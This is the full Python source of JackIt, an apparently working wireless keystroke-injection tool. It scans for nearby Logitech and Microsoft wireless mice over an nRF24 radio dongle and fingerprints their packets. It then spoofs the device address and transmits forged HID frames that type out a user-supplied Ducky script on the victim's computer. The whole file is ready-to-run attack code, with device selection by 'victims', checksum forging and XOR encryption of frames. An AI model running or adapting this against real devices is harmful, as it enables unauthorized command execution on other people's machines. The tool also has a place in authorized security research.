#!/usr/bin/env python
# -*- coding: utf-8 -*-

import datetime
import os
import time
import click
import tabulate
from lib import nrf24, nrf24_reset
import keymap


__version__ = 0.02
__authors__ = "phikshun, infamy"

# some console colours
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray


class DuckyParser(object):
    ''' Help map ducky like script to HID codes to be sent '''
    
    hid_map = {
        '':           [0, 0],
        'ALT':        [0, 4],
        'SHIFT':      [0, 2],
        'CTRL':       [0, 1],
        'GUI':        [0, 8],
        'SCROLLLOCK': [71, 0],
        'ENTER':      [40, 0],
        'F12':        [69, 0],
        'HOME':       [74, 0],
        'F10':        [67, 0],
        'F9':         [66, 0],
        'ESCAPE':     [41, 0],
        'PAGEUP':     [75, 0],
        'TAB':        [43, 0],
        'PRINTSCREEN': [70, 0],
        'F2':         [59, 0],
        'CAPSLOCK':   [57, 0],
        'F1':         [58, 0],
        'F4':         [61, 0],
        'F6':         [63, 0],
        'F8':         [65, 0],
        'DOWNARROW':  [81, 0],
        'DELETE':     [42, 0],
        'RIGHT':      [79, 0],
        'F3':         [60, 0],
        'DOWN':       [81, 0],
        'DEL':        [76, 0],
        'END':        [77, 0],
        'INSERT':     [73, 0],
        'F5':         [62, 0],
        'LEFTARROW':  [80, 0],
        'RIGHTARROW': [79, 0],
        'PAGEDOWN':   [78, 0],
        'PAUSE':      [72, 0],
        'SPACE':      [44, 0],
        'UPARROW':    [82, 0],
        'F11':        [68, 0],
        'F7':         [64, 0],
        'UP':         [82, 0],
        'LEFT':       [80, 0]
    }

    blank_entry = {
        "mod": 0,
        "hid": 0,
        "char": '',
        "sleep": 0
    }

    def __init__(self, attack_script, key_mapping):
        self.hid_map.update(key_mapping)
        self.script = attack_script.split("\n")

    def char_to_hid(self, char):
        return self.hid_map[char]

    def parse(self):
        entries = []

        # process lines for repeat
        for pos, line in enumerate(self.script):
            if line.startswith("REPEAT"):
                self.script.remove(line)
                for i in range(1, int(line.split()[1])):
                    self.script.insert(pos,self.script[pos - 1])

        for line in self.script:
            if line.startswith('ALT'):
                entry = self.blank_entry.copy()
                if line.find(' ') == -1:
                    entry['char'] = ''
                else:
                    entry['char'] = line.split()[1]
                entry['hid'], mod = self.char_to_hid(entry['char'])
                entry['mod'] = 4 | mod
                entries.append(entry)

            elif line.startswith("GUI") or line.startswith('WINDOWS') or line.startswith('COMMAND'):
                entry = self.blank_entry.copy()
                if line.find(' ') == -1:
                    entry['char'] = ''
                else:
                    entry['char'] = line.split()[1]
                entry['hid'], mod = self.char_to_hid(entry['char'])
                entry['mod'] = 8 | mod
                entries.append(entry)

            elif line.startswith('CTRL-ALT') or line.startswith('CONTROL-ALT'):
                entry = self.blank_entry.copy()
                if line.find(' ') == -1:
                    entry['char'] = ''
                else:
                    entry['char'] = line.split()[1]
                entry['hid'], mod = self.char_to_hid(entry['char'])
                entry['mod'] = 4 | 1 | mod
                entries.append(entry)

            elif line.startswith('CTRL-SHIFT') or line.startswith('CONTROL-SHIFT'):
                entry = self.blank_entry.copy()
                if line.find(' ') == -1:
                    entry['char'] = ''
                else:
                    entry['char'] = line.split()[1]
                entry['hid'], mod = self.char_to_hid(entry['char'])
                entry['mod'] = 4 | 2 | mod
                entries.append(entry)

            elif line.startswith('CTRL') or line.startswith('CONTROL'):
                entry = self.blank_entry.copy()
                if line.find(' ') == -1:
                    entry['char'] = ''
                else:
                    entry['char'] = line.split()[1]
                entry['hid'], mod = self.char_to_hid(entry['char'])
                entry['mod'] = 1 | mod
                entries.append(entry)

            elif line.startswith('SHIFT'):
                entry = self.blank_entry.copy()
                if line.find(' ') == -1:
                    entry['char'] = ''
                else:
                    entry['char'] = line.split()[1]
                entry['hid'], mod = self.char_to_hid(entry['char'])
                entry['mod'] = 2 | mod
                entries.append(entry)

            elif line.startswith("ESC") or line.startswith('APP') or line.startswith('ESCAPE'):
                entry = self.blank_entry.copy()
                entry['char'] = "ESC"
                entry['hid'], entry['mod'] = self.char_to_hid('ESCAPE')
                entries.append(entry)

            elif line.startswith("DELAY"):
                entry = self.blank_entry.copy()
                entry['sleep'] = line.split()[1]
                entries.append(entry)

            elif line.startswith("STRING"):
                for char in " ".join(line.split()[1:]):
                    entry = self.blank_entry.copy()
                    entry['char'] = char
                    entry['hid'], entry['mod'] = self.char_to_hid(char)
                    entries.append(entry)

            elif line.startswith("ENTER"):
                entry = self.blank_entry.copy()
                entry['char'] = "\n"
                entry['hid'], entry['mod'] = self.char_to_hid('ENTER')
                entries.append(entry)   

            # arrow keys
            elif line.startswith("UP") or line.startswith("UPARROW"):
                entry = self.blank_entry.copy()
                entry['char'] = "UP"
                entry['hid'], entry['mod'] = self.char_to_hid('UP')
                entries.append(entry)

            elif line.startswith("DOWN") or line.startswith("DOWNARROW"):
                entry = self.blank_entry.copy()
                entry['char'] = "DOWN"
                entry['hid'], entry['mod'] = self.char_to_hid('DOWN')
                entries.append(entry)

            elif line.startswith("LEFT") or line.startswith("LEFTARROW"):
                entry = self.blank_entry.copy()
                entry['char'] = "LEFT"
                entry['hid'], entry['mod'] = self.char_to_hid('LEFT')
                entries.append(entry)

            elif line.startswith("RIGHT") or line.startswith("RIGHTARROW"):
                entry = self.blank_entry.copy()
                entry['char'] = "RIGHT"
                entry['hid'], entry['mod'] = self.char_to_hid('RIGHT')
                entries.append(entry)

            elif len(line) == 0:
                pass

            else:
                print "CAN'T PROCESS... %s" % line

        return entries


class JackIt(object):
    ''' Class for scanning, pinging and fingerprint devices '''

    def __init__(self, disable_lna=False, debug=False, reset=False):
        self.channels = range(2, 84)
        self.channel_index = 0
        self.debug = debug
        self.devices = {}
        self.init_radio(disable_lna, reset)

    def _debug(self, text):
        if self.debug:
            print P + "[D] " + W + text

    def hexify(self, data):
        return ':'.join('{:02X}'.format(x) for x in data)

    def unhexify_addr(self, val):
        return self.unhexify(val)[::-1][:5]

    def unhexify(self, val):
        return val.replace(':', '').decode('hex')

    def serialize_payload(self, p):
        return str(bytearray(p))

    def serialize_address(self, a):
        return ''.join(chr(b) for b in a[::-1])

    def init_radio(self, disable_lna, reset):
        if reset:
            self._debug("Reseting PARadio USB Dongle")
            nrf24_reset.reset_radio(0)
        self.radio = nrf24.nrf24(0)
        if not disable_lna:
            self._debug("Enabled LNA")
            self.radio.enable_lna()

    def add_device(self, address, payload):
        channel = self.channels[self.channel_index]
        if address in self.devices:
            self.devices[address]['count'] += 1
            self.devices[address]['timestamp'] = time.time()
            if not channel in self.devices[address]['channels']:
                self.devices[address]['channels'].append(channel)
            if self.fingerprint_device(payload):
                self.devices[address]['device']  = self.fingerprint_device(payload)
                self.devices[address]['payload'] = payload
        else:
            self.devices[address] = {}
            self.devices[address]['device']    = ''
            self.devices[address]['payload']   = payload
            self.devices[address]['count']     = 1
            self.devices[address]['channels']  = [self.channels[self.channel_index]]
            self.devices[address]['address']   = [int(b, 16) for b in address.split(':')]
            self.devices[address]['timestamp'] = time.time()
            self.devices[address]['device']    = self.fingerprint_device(payload)

    def scan(self, timeout=5.0):
        self.radio.enter_promiscuous_mode('')
        self.radio.set_channel(self.channels[self.channel_index])
        dwell_time = 0.1
        last_tune = time.time()
        start_time = time.time()

        try:
            while time.time() - start_time < timeout:
                if len(self.channels) > 1 and time.time() - last_tune > dwell_time:
                    self.channel_index = (self.channel_index + 1) % (len(self.channels))
                    self.radio.set_channel(self.channels[self.channel_index])
                    last_tune = time.time()

                value = self.radio.receive_payload()
                if len(value) >= 5:
                    address, payload = value[0:5], value[5:]
                    a = self.hexify(address)
                    self._debug("ch: %02d addr: %s packet: %s" % (self.channels[self.channel_index], a, self.hexify(payload)))
                    self.add_device(a, payload)

        except RuntimeError:
            print R + '[!] ' + W + 'Runtime error during scan'
            exit(-1)
        return self.devices

    def sniff(self, timeout, address):
        addr_string = address[:]
        address = [int(b, 16) for b in address.split(':')]
        self.radio.enter_sniffer_mode(self.serialize_address(address))
        self.radio.set_channel(self.channels[self.channel_index])
        dwell_time = 0.1
        ping = '0F:0F:0F:0F'.replace(':', '').decode('hex')
        last_ping = time.time()
        start_time = time.time()

        try:
            while time.time() - start_time < timeout:
                if len(self.channels) > 1 and time.time() - last_ping > dwell_time:
                    if not self.radio.transmit_payload(self.serialize_payload(ping), 1, 1):
                        success = False
                        for self.channel_index in range(len(self.channels)):
                            self.radio.set_channel(self.channels[self.channel_index])
                            if self.radio.transmit_payload(self.serialize_payload(ping), 1, 1):
                                last_ping = time.time()
                                success = True
                                self._debug("Ping success on channel %d" % self.channels[self.channel_index])
                                break

                        if not success:
                            self._debug("Ping failed")
                    else:
                        last_ping = time.time()

                value = self.radio.receive_payload()
                if value[0] == 0:
                    last_ping = time.time()
                    payload = value[1:]
                    self._debug("ch: %02d addr: %s packet: %s" % (self.channels[self.channel_index], addr_string, self.hexify(payload)))
                    self.add_device(addr_string, payload)

        except RuntimeError:
            print R + '[!] ' + W + 'Runtime error while sniffing'
            exit(-1)
        return self.devices

    def sniffer_mode(self, address):
        self.radio.enter_sniffer_mode(self.serialize_address(address))

    def find_channel(self, address):
        ping = '0F:0F:0F:0F'.replace(':', '').decode('hex')
        self.radio.enter_sniffer_mode(self.serialize_address(address))
        for channel in range(2, 84):
            self.radio.set_channel(channel)
            if self.radio.transmit_payload(self.serialize_payload(ping)):
                return channel
        return None

    def set_channel(self, channel):
        self.current_channel = channel
        self.radio.set_channel(channel)

    def transmit_hook(self, payload):
        self._debug("Sending: " + self.hexify(payload))

    def transmit_payload(self, payload):
        self.transmit_hook(payload)
        return self.radio.transmit_payload(self.serialize_payload(payload))

    def fingerprint_device(self, p):
        if not p: return ''
        if len(p) == 19 and (p[0] == 0x08 or p[0] == 0x0c) and p[6] == 0x40:
            # Most likely a non-XOR encrypted Microsoft mouse
            return 'Microsoft HID'
        elif len(p) == 19 and p[0] == 0x0a:
            # Most likely an XOR encrypted Microsoft mouse
            return 'MS Encrypted HID'
        elif len(p) == 10 and p[0] == 0 and p[1] == 0xC2:
            # Definitely a logitech mouse movement packet
            return 'Logitech HID'
        elif len(p) == 22 and p[0] == 0 and p[1] == 0xD3:
            # Definitely a logitech keystroke packet
            return 'Logitech HID'
        elif len(p) == 5 and p[0] == 0 and p[1] == 0x40:
            # Most likely logitech keepalive packet
            return 'Logitech HID'
        elif len(p) == 10 and p[0] == 0 and p[1] == 0x4F:
            # Most likely logitech sleep timer packet
            return 'Logitech HID'
        else:
            return ''

    def attack(self, hid, attack):
        hid.build_frames(attack)
        for key in attack:
            if key['frames']:
                for frame in key['frames']:
                    self.transmit_payload(frame[0])
                    # This code was for additional reliability -- may cause duplicate keystrokes
                    # (currently leaving it disabled)

                    #if not self.transmit_payload(frame[0]):
                    #    for i in range(0,5):
                    #        time.sleep(0.1)
                    #        if self.transmit_payload(frame[0]):
                    #            break
                    time.sleep(frame[1] / 1000.0)


class MicrosoftHID(object):
    ''' Injection code for MS mouse '''

    def __init__(self, address, payload):
        self.address = address
        self.device_vendor = 'Microsoft'
        self.sequence_num = 0
        self.payload_template = payload[:].tolist()
        self.payload_template[4:18] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
        self.payload_template[6] = 67

    def checksum(self, payload):
        # MS checksum algorithm - as per KeyKeriki paper
        payload[-1] = 0
        for i in range(0, len(payload) - 1):
            payload[-1] ^= payload[i]
        payload[-1] = ~payload[-1] & 0xff
        return payload

    def sequence(self, payload):
        # MS frames use a 2 bytes sequence number
        payload[5] = (self.sequence_num >> 8) & 0xff
        payload[4] = self.sequence_num & 0xff
        self.sequence_num += 1
        return payload

    def key(self, payload, key):
        payload[7] = key['mod']
        payload[9] = key['hid']
        return payload

    def frame(self, key={'hid': 0, 'mod': 0}):
        return self.checksum(self.key(self.sequence(self.payload_template[:]), key))

    def build_frames(self, attack):
        for i in range(0, len(attack)):
            key = attack[i]
            key['frames'] = []
            if i < len(attack)-1:
                next_key = attack[i+1]
            else:
                next_key = None

            while self.sequence_num < 10:
                key['frames'].append([self.frame(), 0])

            if key['hid'] or key['mod']:
                key['frames'].append([self.frame(key), 5])
                if not next_key or key['hid'] == next_key['hid'] or next_key['sleep']:
                    key['frames'].append([self.frame(), 0])

            elif key['sleep']:
                count = int(key['sleep']) / 10
                for i in range(0, count):
                    print '10ms add delay'
                    key['frames'].append([self.frame(), 0])


class MicrosoftEncHID(MicrosoftHID):
    ''' Injection code for MS mouse (encrypted) '''

    def __init__(self, address, payload):
        self.address = address
        self.device_vendor = 'Microsoft'
        self.sequence_num = 0
        self.payload_template = self.xor_crypt(payload[:].tolist())
        self.payload_template[4:18] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
        self.payload_template[6] = 67

    def xor_crypt(self, payload):
        # MS encryption algorithm - as per KeyKeriki paper
        raw_address = self.address[::-1][:5]
        for i in range(4, len(payload)):
            payload[i] ^= raw_address[(i - 4) % 5]
        return payload

    def frame(self, key={'hid': 0, 'mod': 0}):
        return self.xor_crypt(self.checksum(self.key(self.sequence(self.payload_template[:]), key)))


class LogitechHID(object):
    ''' Injection for Logitech devices '''

    def __init__(self, address, payload):
        self.address = address
        self.device_vendor = 'Logitech'
        # Mouse frames use type 0xC2
        # Multmedia key frames use type 0xC3
        # To see why this works, read diagram 2.3.2 of:
        # https://lekensteyn.nl/files/logitech/Unifying_receiver_DJ_collection_specification_draft.pdf
        # (discovered by wiresharking usbmon)
        self.payload_template = [0, 0xC1, 0, 0, 0, 0, 0, 0, 0, 0]
        self.keepalive = [0x00, 0x40, 0x04, 0xB0, 0x0C]
        self.hello = [0x00, 0x4F, 0x00, 0x04, 0xB0, 0x10, 0x00, 0x00, 0x00, 0xED]

    def checksum(self, payload):
        # This is also from the KeyKeriki paper
        # Thanks Thorsten and Max!
        cksum = 0xff
        for n in range(0, len(payload) - 1):
            cksum = (cksum - payload[n]) & 0xff
        cksum = (cksum + 1) & 0xff
        payload[-1] = cksum
        return payload

    def key(self, payload, key):
        payload[2] = key['mod']
        payload[3] = key['hid']
        return payload

    def frame(self, key={'hid': 0, 'mod': 0}):
        return self.checksum(self.key(self.payload_template[:], key))

    def build_frames(self, attack):
        for i in range(0, len(attack)):
            key = attack[i]

            if i == 0:
                key['frames'] = [[self.hello[:], 12]]
            else:
                key['frames'] = []

            if i < len(attack)-1:
                next_key = attack[i+1]
            else:
                next_key = None

            if key['hid'] or key['mod']:
                key['frames'].append([self.frame(key), 12])
                key['frames'].append([self.keepalive[:], 0])
                if not next_key or key['hid'] == next_key['hid'] or next_key['sleep']:
                    key['frames'].append([self.frame(), 0])
            elif key['sleep']:
                count = int(key['sleep']) / 10
                for i in range(0, count):
                    key['frames'].append([self.keepalive[:], 10])


def banner():
    print r"""
     ____.              __   .___  __
    |    |____    ____ |  | _|   |/  |_
    |    \__  \ _/ ___\|  |/ /   \   __\
/\__|    |/ __ \\  \___|    <|   ||  |
\________(____  /\___  >__|_ \___||__|
              \/     \/     \/          """

    print "JackIt Version %0.2f" % __version__
    print "Created by %s" % __authors__
    print ""


def confirmroot():
    # make sure we are root
    if os.getuid() != 0:
        print R + "[!] " + W + "ERROR: You need to run as root!"
        print R + "[!] " + W + "login as root (su root) or try sudo ./jackit.py"
        exit(-1)


@click.command()
@click.option('--debug', is_flag=True, help='Enable debug')
@click.option('--script', default="", help="Ducky file to use for injection", type=click.Path())
@click.option('--lowpower', is_flag=True, help="Disable LNA on CrazyPA")
@click.option('--interval', default=5, help="Interval of scan in seconds, default to 5s")
@click.option('--layout', default='us', help="Keyboard layout: %s" % ", ".join(keymap.mapping.keys()))
@click.option('--address', default="", help="Address of device to target attack")
@click.option('--vendor', default="", help="Vendor of device to target (required when specifying address)")
@click.option('--reset', is_flag=True, help="Reset CrazyPA dongle prior to initalization")
def cli(debug, script, lowpower, interval, layout, address, vendor, reset):

    banner()
    confirmroot()

    if debug:
        print O + "[W] " + W + "Debug is enabled."

    if not layout in keymap.mapping.keys():
        print R + '[!] ' + W + "Invalid keyboard layout selected."
        exit(-1)

    targeted = False
    if address and not vendor:
        print R + '[!] ' + W + "Please use --vendor option to specify either Logitech or Microsoft."
        exit(-1)
    elif vendor and not address:
        print R + '[!] ' + W + "Please use --address option when specifying a vendor."
        exit(-1)
    elif vendor and address:
        vendor = vendor.lower()
        if not vendor.startswith("l") and not vendor.startswith("m"):
            print R + '[!] ' + W + "Unknown vendor: specify either Microsoft of Logitech."
            exit(-1)
        else:
            targeted = True
        
    if script == "":
        print R + '[!] ' + W + "You must supply a ducky script using --script <filename>"
        print R + '[!] ' + W + "Attacks are disabled."
        attack = ""
    else:
        f = open(script, 'r')
        parser = DuckyParser(f.read(), keymap.mapping[layout])
        attack = parser.parse()

    # Initialize the radio
    try:
        jack = JackIt(lowpower, debug, reset)
    except Exception as e:
        if e.__str__() == "Cannot find USB dongle.":
            print R + "[!] " + W + "Cannot find Crazy PA USB dongle."
            print R + "[!] " + W + "Please make sure you have it preloaded with the mousejack firmware."
            exit(-1)
        else:
            raise e

    try:
        if targeted:
            print G + "[+] " + W + 'Starting sniff for %s...' % address
            if vendor.startswith("l"):
                jack.add_device(address, [0, 0xC2, 0, 0, 0, 0, 0, 0, 0, 0])
            if vendor.startswith("m"):
                jack.add_device(address, [])
        else:
            print G + "[+] " + W + 'Starting scan...'

        try:
            # Enter main loop
            while True:
                if targeted:
                    devices = jack.sniff(interval, address)
                else:
                    devices = jack.scan(interval)

                click.clear()
                if targeted:
                    print GR + "[+] " + W + ("Sniffing for %s every %ds " % (address, interval)) + G + "CTRL-C " + W + "when ready."
                else:
                    print GR + "[+] " + W + ("Scanning every %ds " % interval) + G + "CTRL-C " + W + "when ready."
                print ""

                idx = 0
                pretty_devices = []
                for key, device in devices.iteritems():
                    idx = idx + 1
                    pretty_devices.append([
                        idx,
                        key,
                        ",".join(str(x) for x in device['channels']),
                        device['count'],
                        str(datetime.timedelta(seconds=int(time.time() - device['timestamp']))) + ' ago',
                        device['device'],
                        jack.hexify(device['payload'])
                    ])

                print tabulate.tabulate(pretty_devices, headers=["KEY", "ADDRESS", "CHANNELS", "COUNT", "SEEN", "TYPE", "PACKET"])
        except KeyboardInterrupt:
            print ""

        if 'devices' not in locals() or len(devices) == 0:
            print R + "[!] " + W + "No devices found please try again..."
            exit(-1)

        if attack == "":
            print R + "[!] " + W + "No attack script was provided..."
            exit(-1)

        print GR + "\n[+] " + W + "Select " + G + "target keys" + W + " (" + G + "1-%s)" % (str(len(devices)) + W) + \
            " separated by commas, or '%s': " % (G + 'all' + W),
        value = click.prompt('', default="all")
        value = value.strip().lower()

        if value == "all":
            victims = pretty_devices[:]
        else:
            victims = []
            for vic in value.split(","):
                if int(vic) <= len(pretty_devices):
                    victims.append(pretty_devices[(int(vic)-1)])
                else:
                    print R + "[!] " + W + ("Device %d key is out of range" % int(vic))

        targets = []
        for victim in victims:
            if victim[1] in devices:
                targets.append(devices[victim[1]])

        for target in targets:
            payload = target['payload']
            channels = target['channels']
            address = target['address']
            device_type = target['device']

            # Sniffer mode allows us to spoof the address
            jack.sniffer_mode(address)
            hid = None
            # Figure out what we've got
            device_type = jack.fingerprint_device(payload)
            if device_type == 'Microsoft HID':
                hid = MicrosoftHID(address, payload)
            elif device_type == 'MS Encrypted HID':
                hid = MicrosoftEncHID(address, payload)
            elif device_type == 'Logitech HID':
                hid = LogitechHID(address, payload)

            if hid:
                # Attempt to ping the devices to find the current channel
                lock_channel = jack.find_channel(address)

                if lock_channel:
                    print GR + '[+] ' + W + 'Ping success on channel %d' % (lock_channel,)
                    print GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.hexify(address), device_type, lock_channel)
                    jack.attack(hid, attack)
                else:
                    # If our pings fail, go full hail mary
                    print R + '[-] ' + W + 'Ping failed, trying all channels'
                    for channel in channels:
                        jack.set_channel(channel)
                        print GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.hexify(address), device_type, channel)
                        jack.attack(hid, attack)
            else:
                print R + '[-] ' + W + "Target %s is not injectable. Skipping..." % (jack.hexify(address))
                continue

        print GR + '\n[+] ' + W + "All attacks completed\n"

    except KeyboardInterrupt:
        print '\n ' + R + '(^C)' + O + ' interrupted\n'
        print "[-] Quitting"

if __name__ == '__main__':
    cli()
